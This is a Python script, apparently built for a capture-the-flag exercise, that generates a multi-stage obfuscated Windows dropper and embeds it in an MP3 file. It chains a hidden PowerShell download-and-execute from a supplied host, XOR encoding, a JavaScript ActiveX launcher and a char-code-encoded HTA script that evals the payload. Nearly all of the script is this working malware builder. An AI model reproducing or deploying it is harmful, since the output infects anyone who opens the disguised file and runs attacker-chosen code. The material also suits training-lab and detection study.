# Related to Host
# Not related to Flag

import sys


if len(sys.argv) != 2:
    # print("Usage: python passive-gen.py http://example.com")
    sys.exit(1)

s1 = (
    r"""iexStart-Process "$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ArgumentList '-w','h','-ep','Unrestricted','-Command',"Set-Variable 3 '"""
    + sys.argv[1]
    + r"""/bestudding.jpg';SI Variable:/Z4D 'Net.WebClient';cd;SV c4H (.`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member)[2].Name).Invoke(`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member|Where{(GV _).Value.Name-clike'*dName'}).Name).Invoke('Ne*ct',1,1))(LS Variable:/Z4D).Value);SV A ((((Get-Variable c4H -ValueO)|Get-Member)|Where{(GV _).Value.Name-clike'*wn*d*g'}).Name);&([ScriptBlock]::Create((Get-Variable c4H -ValueO).((Get-Variable A).Value).Invoke((Variable 3 -Val))))";"""
)

s2 = (
    r"""powershell.exe -w 1 -ep Unrestricted -nop $EFTE =([regex]::Matches('"""
    + bytes([b ^ 204 for b in s1.encode("utf-8")]).hex()
    + r"""','.{2}') | % { [char]([Convert]::ToByte($_.Value,16) -bxor '204') }) -join '';& $EFTE.Substring(0,3) $EFTE.Substring(3)"""
)

s3 = (
    r"""function ioRjQN(FVKq){var ohyLbg= "";for (var emGK = 0;emGK < FVKq.length; emGK++){var ndZC = String.fromCharCode(FVKq[emGK] - 601);ohyLbg = ohyLbg + ndZC}return ohyLbg};var ohyLbg = ioRjQN("""
    + str([c + 601 for c in s2.encode("utf-8")])
    + r""");var emGK = ioRjQN([688,684,700,715,706,713,717,647,684,705,702,709,709]);var ioRjQN = new ActiveXObject(emGK);ioRjQN.Run(ohyLbg, 0, true);"""
)

prj = "SK=102;UP=117;tV=110;Fx=99;nI=116;pV=105;wt=111;RV=32;wV=82;Rp=106;kz=81;CX=78;GH=40;PS=70;YO=86;kF=75;PO=113;QF=41;sZ=123;nd=118;Ge=97;sV=114;wl=104;NL=121;Ep=76;uS=98;Lj=103;ST=61;Ix=34;Im=59;Gm=101;YZ=109;Xj=71;Fi=48;dL=60;cX=46;ho=108;jF=43;Gg=100;aV=90;uD=67;Nj=83;US=91;tg=93;vx=45;xv=54;QB=49;WT=125;FT=55;yN=51;ff=44;it=50;NW=53;kX=57;zN=52;Mb=56;Wn=119;sC=65;Yp=88;FF=79".split(
    ";"
)
prj = {int(p.split("=")[1]): p.split("=")[0] for p in prj}

s4 = (
    r"""<script>window.resizeTo(0, 0);window.moveTo(-9999, -9999); SK=102;UP=117;tV=110;Fx=99;nI=116;pV=105;wt=111;RV=32;wV=82;Rp=106;kz=81;CX=78;GH=40;PS=70;YO=86;kF=75;PO=113;QF=41;sZ=123;nd=118;Ge=97;sV=114;wl=104;NL=121;Ep=76;uS=98;Lj=103;ST=61;Ix=34;Im=59;Gm=101;YZ=109;Xj=71;Fi=48;dL=60;cX=46;ho=108;jF=43;Gg=100;aV=90;uD=67;Nj=83;US=91;tg=93;vx=45;xv=54;QB=49;WT=125;FT=55;yN=51;ff=44;it=50;NW=53;kX=57;zN=52;Mb=56;Wn=119;sC=65;Yp=88;FF=79;var SxhM = String.fromCharCode("""
    + ",".join(prj[c] for c in s3.encode("utf-8"))
    + r""");eval(SxhM); window.close();</script>"""
)

with open("/home/ctf/mp3_template.mp3.no_lfs", "rb") as f:
    mp3 = f.read()

with open("/home/ctf/serve/Coloringoutomic_Host.mp3", "wb") as f:
    f.write(mp3.replace(b"###_PLACEHOLDER_2_###", s4.encode("utf-8")))
